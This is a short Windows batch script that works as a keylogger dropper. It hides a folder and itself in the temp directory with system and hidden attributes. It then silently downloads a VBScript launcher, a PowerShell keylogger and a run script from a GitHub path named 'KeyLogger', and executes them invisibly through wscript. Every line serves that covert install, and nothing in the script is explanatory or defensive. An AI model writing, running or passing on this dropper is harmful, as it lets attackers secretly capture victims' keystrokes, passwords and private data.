@echo off
cd %temp%
if not exist t\ (
  mkdir t
)
attrib +s +h t
attrib +s +h s.bat
cd t
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/run.bat -o r.bat
wscript.exe "i.vbe" "r.bat"
